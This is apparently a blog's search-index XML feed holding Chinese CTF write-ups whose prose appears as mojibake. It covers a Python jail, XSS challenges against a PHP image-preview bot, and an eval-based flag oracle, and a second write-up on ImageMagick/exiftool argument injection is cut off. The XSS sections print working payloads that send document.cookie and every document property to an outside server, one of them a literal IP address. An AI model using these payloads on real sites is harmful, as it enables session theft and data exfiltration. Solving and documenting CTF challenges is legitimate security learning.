<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>infobahnctf2025-wp</title>
    <link href="/2025/11/09/infobahnctf2025-wp/"/>
    <url>/2025/11/09/infobahnctf2025-wp/</url>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="/2025/11/09/infobahnctf2025-wp/#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>åˆæ˜¯å¿™ç¢Œçš„ä¸€å‘¨ï¼Œè€ƒå®Œè¯•æ‰¾äº†ä¸ªå›½å¤–çš„æ¯”èµ›æ‰“æ‰“ï¼Œä¸»è¦æ˜¯å­¦äº†ä¸‹xss</p><h1 id="pyjail"><a href="/2025/11/09/infobahnctf2025-wp/#pyjail" class="headerlink" title="pyjail"></a>pyjail</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> io<br><span class="hljs-keyword">import</span> contextlib<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag.txt&quot;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    FLAG = f.read()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">code</span>):<br>    buf = io.StringIO()<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">with</span> contextlib.redirect_stdout(buf):<br>            <span class="hljs-built_in">exec</span>(code, &#123;&#125;)<br>    <span class="hljs-keyword">except</span> Exception:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br>    <span class="hljs-keyword">return</span> buf.getvalue() <span class="hljs-keyword">or</span> <span class="hljs-literal">None</span><br>code = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;Enter your solution: &quot;</span>)<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(code) &gt; <span class="hljs-number">15</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Code too long&quot;</span>)<br>    exit()<br><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">set</span>(code) &lt;= <span class="hljs-built_in">set</span>(<span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyz &quot;</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Invalid characters&quot;</span>)<br>    exit()<br>result = run(code)<br><span class="hljs-keyword">if</span> result <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Error&quot;</span>)<br>    exit()<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(result) &gt; <span class="hljs-number">500</span>:<br>    <span class="hljs-built_in">print</span>(FLAG)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Output too short&quot;</span>)<br><br></code></pre></td></tr></table></figure><p>è¦æ±‚è¾“å…¥çš„ä»£ç é•¿åº¦å°äº15ï¼Œå¹¶ä¸”åªåŒ…å«å°å†™å­—æ¯å’Œç©ºæ ¼ï¼ŒåŒæ—¶è¾“å‡ºçš„å†…å®¹é•¿åº¦è¦å¤§äº500</p><p>è¿™é‡Œç›´æ¥ä½¿ç”¨â€˜pythonä¹‹ç¦…â€™</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> this<br></code></pre></td></tr></table></figure><p><img src="/2025/11/09/infobahnctf2025-wp/image-20251109235059073.png" alt="image-20251109235059073"></p><h1 id="bitset"><a href="/2025/11/09/infobahnctf2025-wp/#bitset" class="headerlink" title="bitset"></a>bitset</h1><p>åŠŸèƒ½ï¼šå’Œå¸¸è§çš„xsså·®ä¸å¤šï¼Œè®¿é—®&#x2F;bot?url&#x3D;xxx,botå°±ä¼šè®¿é—®</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//127.0.0.1:6969/?url=xxx</span><br></code></pre></td></tr></table></figure><p>6969ç«¯å£çš„æœåŠ¡ï¼ˆå…³é”®ä»£ç ï¼‰</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$IMG</span> = <span class="hljs-string">&#x27;https://i.imgur.com/nh16rl8.png&#x27;</span>;<br><span class="hljs-variable">$url</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>] ?? <span class="hljs-variable">$IMG</span>;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$url</span> !== <span class="hljs-string">&#x27;&#x27;</span> &amp;&amp; !<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^https?:\/\/.+/i&#x27;</span>, <span class="hljs-variable">$url</span>)) &#123;<br>  <span class="hljs-title function_ invoke__">http_response_code</span>(<span class="hljs-number">400</span>);<br>  <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Type: text/plain; charset=utf-8&#x27;</span>);<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;url must start with http(s)://&#x27;</span>;<br>  <span class="hljs-keyword">exit</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render_img_markdown</span>(<span class="hljs-params"><span class="hljs-keyword">string</span> <span class="hljs-variable">$s</span></span>): <span class="hljs-title">string</span> </span>&#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<br>    <span class="hljs-string">&#x27;/!\[ \]\(([^)\r\n]*)\)/&#x27;</span>,<br>    <span class="hljs-string">&quot;&lt;img src=&#x27;<span class="hljs-subst">$1</span>&#x27; loading=&#x27;lazy&#x27;&gt;&quot;</span>,<br>    <span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-string">&#x27;![ ](&#x27;</span> . <span class="hljs-variable">$s</span> . <span class="hljs-string">&#x27;)&#x27;</span>, ENT_HTML5, <span class="hljs-string">&#x27;UTF-8&#x27;</span>)<br>  );<br>&#125;<br><span class="hljs-meta">?&gt;</span><br>    ...<br>&lt;h2&gt;Preview&lt;/h2&gt;<br>&lt;div&gt;<span class="hljs-meta">&lt;?=</span> <span class="hljs-title function_ invoke__">render_img_markdown</span>(<span class="hljs-variable">$url</span>) <span class="hljs-meta">?&gt;</span>&lt;/div&gt;<br></code></pre></td></tr></table></figure><p>å¾ˆæ˜æ˜¾xssçš„æ³¨å…¥ç‚¹å°±åœ¨url</p><p>å› ä¸ºæ˜¯æ’åˆ°imgæ ‡ç­¾çš„srcå±æ€§é‡Œï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨å±æ€§æ³¨å…¥ï¼Œæ’å…¥ä¸€ä¸ªonerrorå±æ€§æ¥æ‰§è¡Œæ¶æ„js</p><p>å°è¯•æ’å…¥ <a href="http://a/">http://a</a>â€˜ onerror&#x3D;alert(1)ï¼Œå¤±è´¥äº†</p><p><img src="/2025/11/09/infobahnctf2025-wp/image-20251110000119858.png" alt="image-20251110000119858"></p><p>åˆ†æå‘ç°æ˜¯å› ä¸ºrender_img_markdownå‡½æ•°åœ¨æ­£åˆ™åŒ¹é…çš„æ—¶å€™åŒ¹é…åˆ°å³æ‹¬å·å°±ç»“æŸï¼Œæ‰€ä»¥payloadé‡Œä¸èƒ½å‡ºç°å³æ‹¬å·</p><p>ä¸èƒ½ç”¨å³æ‹¬å·çš„è¯å¯ä»¥ä½¿ç”¨åå¼•å·æ¥ä»£æ›¿</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">http:<span class="hljs-regexp">//x</span><span class="hljs-string">&#x27; onerror=&#x27;</span>alert<span class="hljs-string">`1`</span><span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="/2025/11/09/infobahnctf2025-wp/image-20251110000616134.png" alt="image-20251110000616134"></p><p>æ¥ä¸‹æ¥æƒ³åŠæ³•è¯»cookieä¼ åˆ°æœåŠ¡å™¨å°±è¡Œäº†</p><p>è¿™é‡Œåšæ³•å¾ˆå¤šï¼Œç»™å‡ºä¸€ç§payload</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>x<span class="hljs-string">&#x27; onerror=&#x27;</span>this.src=`http:<span class="hljs-regexp">//y</span>ou-vps/?f=`+document.cookie<span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure><h1 id="bitsets"><a href="/2025/11/09/infobahnctf2025-wp/#bitsets" class="headerlink" title="bitsets"></a>bitsets</h1><p>è¿™æ¬¡è¦æ‹¿åˆ°flag2 </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> flag23;<br><span class="hljs-keyword">if</span> (q.<span class="hljs-property">length</span> &lt;= <span class="hljs-number">55</span>) &#123;<br>  flag23 = process.<span class="hljs-property">env</span>.<span class="hljs-property">FLAG3</span> || <span class="hljs-string">&quot;infobahn&#123;fake_flag3&#125;&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (q.<span class="hljs-property">length</span> &lt;= <span class="hljs-number">111</span>) &#123;<br>  flag23 = process.<span class="hljs-property">env</span>.<span class="hljs-property">FLAG2</span> || <span class="hljs-string">&quot;infobahn&#123;fake_flag2&#125;&quot;</span>;<br>&#125;<br><span class="hljs-keyword">if</span> (flag23) &#123;<br>  <span class="hljs-keyword">await</span> p.<span class="hljs-title function_">evaluateOnNewDocument</span>(<span class="hljs-function"><span class="hljs-params">flag</span> =&gt;</span> &#123;<br>    <span class="hljs-keyword">if</span> (location.<span class="hljs-property">hostname</span> == <span class="hljs-string">&quot;127.0.0.1&quot;</span>) &#123;<br>      <span class="hljs-variable language_">document</span>[<span class="hljs-string">&quot;flag&quot;</span> + <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>().<span class="hljs-title function_">toString</span>(<span class="hljs-number">36</span>).<span class="hljs-title function_">slice</span>(<span class="hljs-number">2</span>)] = flag;<br>    &#125;<br>  &#125;, flag23);<br>&#125;<br></code></pre></td></tr></table></figure><p>flagæ”¾åœ¨äº†ä¸€ä¸ªå±æ€§é‡Œé¢ï¼Œå±æ€§çš„åå­—æ˜¯éšæœºçš„ï¼Œå¹¶ä¸”è¦æ±‚payloadçš„é•¿åº¦å°äº111</p><p>é¦–å…ˆå…ˆä¸è€ƒè™‘é•¿åº¦ï¼Œè¦è·å–åˆ°è¿™ä¸ªéšæœºçš„å±æ€§çš„å†…å®¹ï¼Œè‚¯å®šå…ˆè€ƒè™‘éå†</p><p>ç”¨forå¾ªç¯éå†æ‰€æœ‰å±æ€§ï¼Œæ‰¾åˆ°å±æ€§åæ˜¯flagå¼€å¤´çš„ï¼Œç„¶åä½¿ç”¨document[i]è¯»å‡ºæ¥ä¼ åˆ°æœåŠ¡å™¨ï¼Œä½†æ˜¯è€ƒè™‘é•¿åº¦çš„è¯ï¼Œæˆ‘é€‰çš„æ˜¯éå†æ‰€æœ‰å±æ€§æŠŠä»–ä»¬éƒ½ä¼ åˆ°æœåŠ¡å™¨ï¼Œå°±ä¸€å®šèƒ½æ‰¾åˆ°flagï¼Œå¹¶ä¸”é•¿åº¦ä¹Ÿæ²¡é—®é¢˜</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">for</span>(i <span class="hljs-keyword">in</span> <span class="hljs-variable language_">document</span>)<span class="hljs-title function_">open</span>(<span class="hljs-string">&#x27;http://106.14.70.254/&#x27;</span>+<span class="hljs-variable language_">document</span>[i])<br></code></pre></td></tr></table></figure><p>è¿™é‡Œé‡åˆ°ä¸€ä¸ªé—®é¢˜ï¼Œå‰é¢è¯´äº†ï¼Œæ— æ³•ä½¿ç”¨å³æ‹¬å·ï¼Œäºæ˜¯å°±æ¥åˆ°äº†æœ€å…³é”®çš„éƒ¨åˆ†â€”â€”åˆ©ç”¨jsä¼ªåè®®+urlç¼–ç </p><p>æŠŠå³æ‹¬å·ç¼–ç ä¹‹åå°±ä¸ä¼šè¢«åŒ¹é…åˆ°äº†ï¼Œä»¥alertä¸ºä¾‹</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">http:<span class="hljs-regexp">//x</span><span class="hljs-string">&#x27; onerror=&quot;location=&#x27;</span>javascript:alert<span class="hljs-variable">%28</span>1<span class="hljs-variable">%29</span><span class="hljs-string">&#x27;&quot;</span><br></code></pre></td></tr></table></figure><p>æŠŠåé¢è¿™ä¸€ä¸²èµ‹å€¼ç»™window.locationçš„æ—¶å€™ï¼Œæµè§ˆå™¨è¿™ä¸ªå­—ç¬¦ä¸²å½“ä½œurlæ¥è§£æï¼Œå‘ç°æ˜¯jsä¼ªåè®®ï¼Œä¼šå¯¹åé¢çš„éƒ¨åˆ†è¿›è¡Œurlè§£ç ï¼Œäºæ˜¯å°±èƒ½æˆåŠŸæ‰§è¡Œalert(1)</p><p>ä½†æ˜¯è€ƒè™‘åˆ°urlç¼–ç ä¼šè®©é•¿åº¦å˜é•¿ï¼Œæ‰€ä»¥æˆ‘ä»¬ç¼–ç å°½å¯èƒ½å°‘çš„å­—ç¬¦</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">http:<span class="hljs-regexp">//x</span><span class="hljs-string">&#x27; onerror=&quot;location=&#x27;</span>javascript:<span class="hljs-keyword">for</span>(i in document<span class="hljs-variable">%29open</span>(<span class="hljs-variable">%27http</span>:<span class="hljs-regexp">//</span><span class="hljs-number">106.14</span><span class="hljs-number">.70</span><span class="hljs-number">.254</span>/<span class="hljs-variable">%27</span>+document[i]<span class="hljs-variable">%29</span><span class="hljs-string">&#x27;&quot;</span><br></code></pre></td></tr></table></figure><p>è¿™ä¸ªpayloadé•¿åº¦å†109ï¼Œå‹‰å¼ºæ»¡è¶³111çš„è¦æ±‚</p><h1 id="bitset-revenge-bitsets-revenge"><a href="/2025/11/09/infobahnctf2025-wp/#bitset-revenge-bitsets-revenge" class="headerlink" title="bitset revenge&amp;bitsets revenge"></a>bitset revenge&amp;bitsets revenge</h1><p>ä½¿ç”¨ç›¸åŒçš„payloadå¯ä»¥ç›´æ¥æ‰“ï¼Œç›¸æ¯”æ˜¯éé¢„æœŸäº†ï¼ˆ</p><h1 id="speechless"><a href="/2025/11/09/infobahnctf2025-wp/#speechless" class="headerlink" title="speechless"></a>speechless</h1><p>ä¸€é“æœ‰è¶£çš„jailï¼Œæ„Ÿè§‰è‡ªå·±çš„è§£æ³•ä¹Ÿæ˜¯éé¢„æœŸï¼Œ<del>æœ‰ç‚¹åƒæ•°å­¦é¢˜äº†</del></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python">allowed = <span class="hljs-string">&quot;ab.=-/&quot;</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag.txt&quot;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    flag = f.read()<br>a = <span class="hljs-literal">None</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    expr = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;&gt;&gt;&gt; &quot;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">all</span>(char <span class="hljs-keyword">in</span> allowed <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> expr):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;you need to try harder&#x27;</span>)<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">any</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;blocked&#125;</span>==&quot;</span> <span class="hljs-keyword">in</span> expr <span class="hljs-keyword">or</span> <span class="hljs-string">f&quot;==<span class="hljs-subst">&#123;blocked&#125;</span>&quot;</span> <span class="hljs-keyword">in</span> expr <span class="hljs-keyword">for</span> blocked <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;ab&quot;</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;stop comparing the flag&#x27;</span>)<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">try</span>:<br>        a = <span class="hljs-built_in">eval</span>(expr, &#123;<span class="hljs-string">&quot;a&quot;</span>: a&#125; | &#123;<span class="hljs-string">&quot;b&quot;</span> * (index + <span class="hljs-number">1</span>): char <span class="hljs-keyword">for</span> index, char <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(flag)&#125;)<br>        <span class="hljs-built_in">print</span>(a)<br>    <span class="hljs-keyword">except</span>:<br>        a = <span class="hljs-literal">None</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;stop breaking things &gt;:(&#x27;</span>)<br></code></pre></td></tr></table></figure><p>ä½ åªèƒ½è¾“å…¥ab.&#x3D;-&#x2F;ï¼Œè¾“å…¥bä¼šè¿”å›flagçš„ç¬¬ä¸€ä½ï¼Œbbè¿”å›ç¬¬äºŒä½ï¼Œä»¥æ­¤ç±»æ¨ï¼Œå¹¶ä¸”å°†æ¯æ¬¡è¾“å…¥çš„è¿”å›å€¼å­˜åˆ°aé‡Œé¢ï¼Œæ¯”å¦‚å…ˆè¾“å…¥bbï¼Œå†è¾“å…¥aï¼Œå°±ä¼šè¿”å›flagçš„ç¬¬äºŒä½</p><p>è§£æ³•ï¼š</p><p>â€‹ä»¥ç¬¬ä¸€ä½ä¸ºä¾‹ï¼Œæˆ‘ä»¬å…ˆè¾“å…¥bï¼Œæ­¤æ—¶a&#x3D;flag[0]</p><p>â€‹å¦‚æœæˆ‘èƒ½è®©aé€æ¸å‡å°ï¼Œåˆ¤æ–­å‡å°å¤šå°‘çš„æ—¶å€™aå˜æˆäº†0ï¼Œé‚£æˆ‘å°±èƒ½çŸ¥é“flag[0]çš„å€¼æ˜¯å¤šå°‘äº†</p><p>â€‹é‚£ä¹ˆè¦å‡å»è°å‘¢ï¼Œéœ€è¦æ‰¾ä¸€ä¸ªä¸å˜å€¼ï¼Œè¿™é‡Œä½¿ç”¨b&#x2F;&#x2F;bå¾—åˆ°1</p><p>â€‹æµç¨‹ï¼š</p><p>â€‹è¾“å…¥bï¼Œæ­¤æ—¶a&#x3D;flag[0]</p><p>â€‹è¾“å…¥a-b&#x2F;&#x2F;bï¼Œæ­¤æ—¶a&#x3D;flag[0]-1</p><p>â€‹åˆ©ç”¨é™¤æ•°ä¸èƒ½ä¸º0åˆ¤æ–­aæ­¤æ—¶æ˜¯å¦ç­‰äº0ï¼Œè¾“å…¥b&#x2F;&#x2F;aï¼Œè‹¥æŠ¥é”™ï¼Œè¯´æ˜aæ­¤æ—¶ä¸º0ï¼Œé‚£ä¹ˆç¬¬ä¸€ä½çš„asciiç å°±æ˜¯1ï¼Œå¦‚æœä¸ä¸º0ï¼Œåˆ™è¿›å…¥ä¸‹ä¸€æ­¥</p><p>â€‹è¾“å…¥bï¼Œå†è¾“å…¥a-b&#x2F;&#x2F;b-b&#x2F;&#x2F;bï¼Œéšåä»¥æ­¤ç±»æ¨ï¼Œé‡å¤ä¸Šè¿°æ­¥éª¤ï¼Œç›´åˆ°æŠ¥é”™ï¼Œå°±èƒ½åˆ¤æ–­å‡ºè¿™ä¸€ä½çš„å€¼äº†</p><p>ä¸éš¾çœ‹å‡ºï¼Œæ­¤æ–¹æ³•æ¯”è¾ƒèŠ±æ—¶é—´ï¼Œæ“ä¸ªè„šæœ¬ï¼Œçˆ†ä¸€ä½éœ€è¦ä¸Šåƒæ¬¡ï¼Œä½†æ˜¯æ€è·¯æ˜¯æ²¡é—®é¢˜çš„ï¼Œå†™è„šæœ¬çš„æ—¶å€™å¯ä»¥è€ƒè™‘ä¸€äº›ä¼˜åŒ–çš„æ–¹æ³•æ¥åŠ å¿«çˆ†ç ´é€Ÿåº¦&#x2F;å‡å°‘çˆ†ç ´æ¬¡æ•°ï¼Œæ ¸å¿ƒä¼˜åŒ–æ€è·¯æ˜¯å‡å°‘å‘åŒ…çš„æ¬¡æ•°ï¼Œç¯‡å¹…çš„åŸå› è„šæœ¬è¿™é‡Œå°±ä¸è´´äº†ï¼Œæ‰¾aiå°±èƒ½æ“</p><h1 id="æ€»ç»“"><a href="/2025/11/09/infobahnctf2025-wp/#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>æ„Ÿè§‰åŸºæœ¬éƒ½æ˜¯æ‰“çš„éé¢„æœŸï¼Œä¸è¿‡å­¦åˆ°ä¸€äº›xssçš„ç‚¹ï¼Œä¸»è¦å°±æ˜¯jsä¼ªåè®®+urlç¼–ç </p>]]></content>
    
    
    
    <tags>
      
      <tag>-wp -xss</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>m0leconctf--å‘½ä»¤å‚æ•°æ³¨å…¥</title>
    <link href="/2025/10/27/m0leconctf-%E5%91%BD%E4%BB%A4%E5%8F%82%E6%95%B0%E6%B3%A8%E5%85%A5/"/>
    <url>/2025/10/27/m0leconctf-%E5%91%BD%E4%BB%A4%E5%8F%82%E6%95%B0%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="/2025/10/27/m0leconctf-å‘½ä»¤å‚æ•°æ³¨å…¥/#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>æœ€è¿‘äº‹æƒ…æ¯”è¾ƒå¤šï¼Œé¢˜åšå¾—æ¯”è¾ƒå°‘äº†ï¼Œå‘¨æœ«æ‰“äº†ä¸€ä¸ªå›½å¤–çš„æ¯”èµ›ï¼Œè€ƒå¯Ÿçš„ç‚¹æ˜¯å‘½ä»¤å‚æ•°æ³¨å…¥</p><h1 id="é¢˜ç›®"><a href="/2025/10/27/m0leconctf-å‘½ä»¤å‚æ•°æ³¨å…¥/#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;img&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;name&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$proc</span> = <span class="hljs-title function_ invoke__">proc_open</span>(<br>        <span class="hljs-variable">$cmd</span> = [<br>            <span class="hljs-string">&#x27;/opt/convert.sh&#x27;</span>,<br>            <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;img&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>],<br>            <span class="hljs-variable">$outputName</span> = <span class="hljs-string">&#x27;static/&#x27;</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;name&#x27;</span>].<span class="hljs-string">&#x27;.png&#x27;</span><br>        ],<br>        [],<br>        <span class="hljs-variable">$pipes</span><br>    );<br>    <span class="hljs-title function_ invoke__">proc_close</span>(<span class="hljs-variable">$proc</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>é¢˜ç›®å¤§æ¦‚å°±æ˜¯ä¸Šä¼ ä¸€ä¸ªå›¾ç‰‡ï¼Œç„¶åå›æ‰§è¡Œconvert.shè„šæœ¬å¯¹å›¾ç‰‡è¿›è¡Œå¤„ç†ï¼Œç„¶åä¿å­˜åˆ°staticç›®å½•ï¼Œå¹¶ä¸”å¯ä»¥è‡ªå·±æŒ‡å®šæ–‡ä»¶å</p><p><strong>&#x2F;opt&#x2F;convert.sh</strong></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-meta">#!/bin/bash</span><br><span class="hljs-built_in">set</span> -x<br>convert <span class="hljs-variable">$1</span> -resize 64x64 -background none -gravity center -extent 64x64 <span class="hljs-variable">$2</span><br>find . -<span class="hljs-built_in">type</span> f -<span class="hljs-built_in">exec</span> exiftool -overwrite_original -all= &#123;&#125; + &gt;/dev/null 2&gt;&amp;1 || <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><h1 id="åˆ†æ"><a href="/2025/10/27/m0leconctf-å‘½ä»¤å‚æ•°æ³¨å…¥/#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h1><p>å…ˆç®€å•ä»‹ç»ä¸‹shè„šæœ¬</p><p><strong>convert</strong>å‘½ä»¤æ˜¯ImageMagickè½¯ä»¶åŒ…ä¸­çš„ä¸€éƒ¨åˆ†ï¼Œç”¨äºåœ¨ä¸åŒçš„å›¾åƒæ ¼å¼ä¹‹é—´è¿›è¡Œè½¬æ¢ï¼Œå¹¶æ”¯æŒå¤šç§å›¾åƒå¤„ç†æ“ä½œã€‚</p><p>è¿™é‡Œçš„$1å°±æ˜¯ä¸Šä¼ çš„æ–‡ä»¶çš„ä¸´æ—¶è·¯å¾„ï¼Œ$2æ˜¯ä¿å­˜çš„ä½ç½®ï¼Œ<del>çœ‹èµ·æ¥è²Œä¼¼å¯ä»¥å®ç°å‘½ä»¤æ‹¼æ¥</del></p><p><strong>Exiftool</strong> æ˜¯ä¸€ä¸ªå‘½ä»¤è¡Œåº”ç”¨ç¨‹åºå’Œ Perl åº“ï¼Œå…è®¸æ‚¨è¯»å–å’Œå†™å…¥å›¾åƒã€éŸ³é¢‘å’Œè§†é¢‘æ–‡ä»¶ä¸­çš„ EXIFã€GPSã€IPTCã€XMPã€makernotes å’Œå…¶ä»–å…ƒæ•°æ®ä¿¡æ¯</p><p>è¿™ä¸ªè„šæœ¬å®ç°äº†å¯¹ä¸Šä¼ å›¾ç‰‡è¿›è¡Œå¤„ç†ï¼Œç„¶ååˆ©ç”¨exiftoolæ¸…æ¥šå½“å‰æ–‡ä»¶å¤¹çš„æ‰€æœ‰æ–‡ä»¶çš„å…ƒæ•°æ®</p><p>é¦–å…ˆæ‰§è¡Œå‘½ä»¤æ—¶ä½¿ç”¨çš„æ˜¯phpçš„æ•°ç»„ï¼Œè¿™å°±å¯¼è‡´äº†å‘½ä»¤æ‹¼æ¥çš„æ€è·¯ä¸å¯å–äº†ï¼Œå› 